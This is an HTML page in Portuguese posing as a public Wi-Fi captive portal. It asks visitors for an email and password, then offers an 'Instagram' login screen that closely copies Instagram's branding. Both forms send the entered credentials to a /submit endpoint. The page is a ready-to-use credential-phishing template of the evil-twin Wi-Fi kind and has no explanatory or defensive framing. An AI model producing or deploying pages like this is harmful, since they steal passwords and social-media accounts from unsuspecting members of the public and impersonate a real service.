<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wi-Fi Público — Acesso à Internet</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=DM+Sans:wght@400;500;600&display=swap');

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: #f2f2f2;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    /* ── TELA WI-FI ─────────────────────────────── */
    #screen-wifi {
      width: 100%;
      max-width: 380px;
    }

    #screen-wifi .card {
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 2px 16px rgba(0, 0, 0, 0.1);
      padding: 40px 36px;
    }

    .wifi-icon {
      text-align: center;
      margin-bottom: 20px;
      color: #2563eb;
    }

    #screen-wifi h1 {
      font-size: 1.2rem;
      font-weight: 600;
      color: #111;
      text-align: center;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 0.82rem;
      color: #888;
      text-align: center;
      margin-bottom: 28px;
    }

    #screen-wifi label {
      display: block;
      font-size: 0.8rem;
      font-weight: 500;
      color: #444;
      margin-bottom: 5px;
    }

    #screen-wifi input[type="email"],
    #screen-wifi input[type="password"] {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 0.9rem;
      color: #111;
      outline: none;
      margin-bottom: 16px;
      transition: border-color 0.2s;
    }

    #screen-wifi input[type="email"]:focus,
    #screen-wifi input[type="password"]:focus {
      border-color: #2563eb;
    }

    #screen-wifi button[type="submit"] {
      width: 100%;
      padding: 11px;
      background: #2563eb;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 0.92rem;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s;
    }

    #screen-wifi button[type="submit"]:hover {
      background: #1d4ed8;
    }

    .terms {
      display: flex;
      align-items: flex-start;
      gap: 8px;
      margin-top: 14px;
    }

    .terms input {
      margin-top: 2px;
      accent-color: #2563eb;
      cursor: pointer;
    }

    .terms label {
      font-size: 0.75rem;
      color: #888;
      font-weight: 400;
      margin: 0;
    }

    .terms a {
      color: #2563eb;
      text-decoration: none;
    }

    .terms a:hover {
      text-decoration: underline;
    }

    .divider-line {
      border: none;
      border-top: 1px solid #eee;
      margin: 22px 0;
    }

    .or-divider {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 0.75rem;
      color: #bbb;
      margin: 0;
    }

    .or-divider::before,
    .or-divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #eee;
    }

    .btn-instagram {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: 100%;
      padding: 11px;
      margin-top: 14px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-family: 'Inter', sans-serif;
      font-size: 0.88rem;
      font-weight: 500;
      color: #111;
      text-decoration: none;
      cursor: pointer;
      transition: background 0.2s, border-color 0.2s;
    }

    .btn-instagram:hover {
      background: #fafafa;
      border-color: #c13584;
    }

    .btn-instagram svg {
      flex-shrink: 0;
    }

    /* ── TELA INSTAGRAM ─────────────────────────── */
    #screen-ig {
      display: none;
      font-family: 'DM Sans', sans-serif;
      background: #fafafa;
      width: 100%;
      flex-direction: column;
      align-items: center;
      position: relative;
    }

    #screen-ig::before {
      content: '';
      position: fixed;
      inset: 0;
      background: radial-gradient(ellipse at 60% 0%, rgba(214, 36, 159, 0.06) 0%, transparent 60%),
        radial-gradient(ellipse at 10% 90%, rgba(253, 175, 45, 0.07) 0%, transparent 55%);
      pointer-events: none;
      z-index: 0;
    }

    .ig-wrapper {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 360px;
      animation: fadeUp 0.45s cubic-bezier(.22, .68, 0, 1.2) both;
    }

    @keyframes fadeUp {
      from {
        opacity: 0;
        transform: translateY(18px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .ig-card {
      background: #fff;
      border: 1px solid #efefef;
      border-radius: 12px;
      padding: 44px 36px 28px;
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
      margin-bottom: 12px;
    }

    .logo-wrap {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-bottom: 32px;
    }

    .logo-text {
      font-family: 'DM Sans', sans-serif;
      font-size: 1.7rem;
      font-weight: 600;
      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      white-space: nowrap;
      line-height: 1;
    }

    .ig-field {
      position: relative;
      margin-bottom: 8px;
    }

    .ig-field input {
      width: 100%;
      padding: 12px 14px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      font-family: 'DM Sans', sans-serif;
      font-size: 0.88rem;
      color: #262626;
      outline: none;
      transition: border-color 0.2s, background 0.2s;
      -webkit-appearance: none;
    }

    .ig-field input::placeholder {
      color: #aaa;
    }

    .ig-field input:focus {
      border-color: #a8a8a8;
      background: #fff;
    }

    .toggle-pw {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 0.75rem;
      font-weight: 600;
      color: #262626;
      cursor: pointer;
      user-select: none;
    }

    .ig-field input.has-toggle {
      padding-right: 52px;
    }

    #screen-ig button[type="submit"] {
      width: 100%;
      padding: 10px;
      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      color: #fff;
      border: none;
      border-radius: 8px;
      font-family: 'DM Sans', sans-serif;
      font-size: 0.9rem;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
      transition: opacity 0.2s, transform 0.1s;
      letter-spacing: 0.01em;
    }

    #screen-ig button[type="submit"]:hover {
      opacity: 0.9;
    }

    #screen-ig button[type="submit"]:active {
      transform: scale(0.99);
    }

    .ig-divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
      gap: 14px;
    }

    .ig-divider::before,
    .ig-divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #efefef;
    }

    .ig-divider span {
      font-size: 0.72rem;
      font-weight: 600;
      color: #aaa;
      letter-spacing: 0.06em;
    }

    .fb-login {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      color: #385185;
      font-size: 0.88rem;
      font-weight: 600;
      text-decoration: none;
      margin-bottom: 22px;
      transition: color 0.2s;
    }

    .fb-login:hover {
      color: #1877f2;
    }

    .forgot {
      display: block;
      text-align: center;
      font-size: 0.78rem;
      color: #00376b;
      text-decoration: none;
      opacity: 0.8;
      transition: opacity 0.2s;
    }

    .forgot:hover {
      opacity: 1;
      text-decoration: underline;
    }

    .signup-card {
      background: #fff;
      border: 1px solid #efefef;
      border-radius: 12px;
      padding: 18px;
      text-align: center;
      font-size: 0.88rem;
      color: #555;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
    }

    .signup-card a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }

    .signup-card a:hover {
      text-decoration: underline;
    }

    .app-links {
      text-align: center;
      margin-top: 24px;
      font-size: 0.78rem;
      color: #888;
    }

    .app-links p {
      margin-bottom: 10px;
    }

    .app-badges {
      display: flex;
      justify-content: center;
      gap: 8px;
    }

    .badge-btn {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      border: 1px solid #dbdbdb;
      border-radius: 6px;
      padding: 5px 10px;
      font-size: 0.72rem;
      font-weight: 600;
      color: #262626;
      text-decoration: none;
      background: #fff;
      transition: border-color 0.2s;
    }

    .badge-btn:hover {
      border-color: #aaa;
    }
  </style>
</head>

<body>

  <!-- ════════════════ TELA WI-FI ════════════════ -->
  <div id="screen-wifi">
    <div class="card">

      <div class="wifi-icon">
        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
          stroke-linecap="round" stroke-linejoin="round">
          <path d="M5 12.55a11 11 0 0 1 14.08 0" />
          <path d="M1.42 9a16 16 0 0 1 21.16 0" />
          <path d="M8.53 16.11a6 6 0 0 1 6.95 0" />
          <circle cx="12" cy="20" r="1" fill="currentColor" stroke="none" />
        </svg>
      </div>

      <h1>Acesso à Rede Wi-Fi</h1>
      <p class="subtitle">Insira seus dados para se conectar à internet.</p>

      <form action="/submit" method="post">
        <label for="email">E-mail</label>
        <input type="email" id="email" name="email" placeholder="usuario@exemplo.com" required autocomplete="email">

        <label for="senha-wifi">Senha</label>
        <input type="password" id="senha-wifi" name="senha" placeholder="••••••••" required
          autocomplete="current-password">

        <button type="submit">Conectar</button>

        <div class="terms">
          <input type="checkbox" id="aceite" name="aceite" required>
          <label for="aceite">
            Concordo com os <a href="#" target="_blank">Termos de Uso</a> desta rede pública.
          </label>
        </div>
      </form>

      <hr class="divider-line">
      <div class="or-divider">ou</div>

      <button class="btn-instagram" onclick="showInstagram()">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <defs>
            <radialGradient id="ig1" cx="30%" cy="107%" r="150%">
              <stop offset="0%" stop-color="#fdf497" />
              <stop offset="5%" stop-color="#fdf497" />
              <stop offset="45%" stop-color="#fd5949" />
              <stop offset="60%" stop-color="#d6249f" />
              <stop offset="90%" stop-color="#285AEB" />
            </radialGradient>
          </defs>
          <rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="url(#ig1)" />
          <circle cx="12" cy="12" r="4.5" stroke="#fff" stroke-width="1.8" fill="none" />
          <circle cx="17.2" cy="6.8" r="1.2" fill="#fff" />
        </svg>
        Conectar usando Instagram
      </button>

    </div>
  </div>

  <!-- ════════════════ TELA INSTAGRAM ════════════ -->
  <div id="screen-ig">
    <div class="ig-wrapper">
      <div class="ig-card">

        <div class="logo-wrap">
          <svg width="38" height="38" viewBox="0 0 51 51" fill="none" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <radialGradient id="igIcon" cx="30%" cy="107%" r="150%">
                <stop offset="0%" stop-color="#fdf497" />
                <stop offset="5%" stop-color="#fdf497" />
                <stop offset="45%" stop-color="#fd5949" />
                <stop offset="60%" stop-color="#d6249f" />
                <stop offset="90%" stop-color="#285AEB" />
              </radialGradient>
            </defs>
            <rect width="51" height="51" rx="12" fill="url(#igIcon)" />
            <rect x="6" y="6" width="39" height="39" rx="8.5" stroke="white" stroke-width="3.2" fill="none" />
            <circle cx="25.5" cy="25.5" r="8.5" stroke="white" stroke-width="3.2" fill="none" />
            <circle cx="37.5" cy="13.5" r="2.4" fill="white" />
          </svg>
          <span class="logo-text">Instagram</span>
        </div>

        <form action="/submit" method="post">

          <div class="ig-field">
            <input type="text" id="usuario" name="email" placeholder="Telefone, nome de usuário ou email" required
              autocomplete="username">
          </div>

          <div class="ig-field">
            <input type="password" id="senha-ig" name="senha" class="has-toggle" placeholder="Senha" required
              autocomplete="current-password">
            <span class="toggle-pw" onclick="
              var i = document.getElementById('senha-ig');
              i.type = i.type === 'password' ? 'text' : 'password';
              this.textContent = i.type === 'password' ? 'Exibir' : 'Ocultar';
            ">Exibir</span>
          </div>

          <button type="submit">Entrar</button>

          <div class="ig-divider"><span>OU</span></div>

          <a href="#" class="fb-login">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#385185">
              <path
                d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.413c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.265h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z" />
            </svg>
            Entrar com o Facebook
          </a>

          <a href="#" class="forgot">Esqueceu a senha?</a>
        </form>
      </div>

      <div class="signup-card">
        Não tem uma conta? <a href="#">Cadastre-se</a>
      </div>

      <div class="app-links">
        <p>Baixe o aplicativo.</p>
        <div class="app-badges">
          <a href="#" class="badge-btn">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
              <path
                d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z" />
            </svg>
            App Store
          </a>
          <a href="#" class="badge-btn">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
              <path
                d="M3.18 23.76c.3.17.64.24.99.2l12.29-12.29L13.05 8.3 3.18 23.76zm17.3-10.31L17.6 12l-2.65 2.65 2.64 2.65 2.9-1.66c.83-.48.83-1.27 0-1.75l-.01.02zM3.54.28C3.22.1 2.87.04 2.54.12L14.93 12.5 3.54.28zM13.05 13.7L2.54 23.88c.33.08.68.02 1-.16l11.96-6.87-2.45-2.15z" />
            </svg>
            Google Play
          </a>
        </div>
      </div>
    </div>
  </div>

  <script>
    function showInstagram() {
      document.getElementById('screen-wifi').style.display = 'none';
      var ig = document.getElementById('screen-ig');
      ig.style.display = 'flex';
      // adapta o body para o layout do instagram
      document.body.style.background = '#fafafa';
      document.body.style.flexDirection = 'column';
    }
  </script>

</body>

</html>
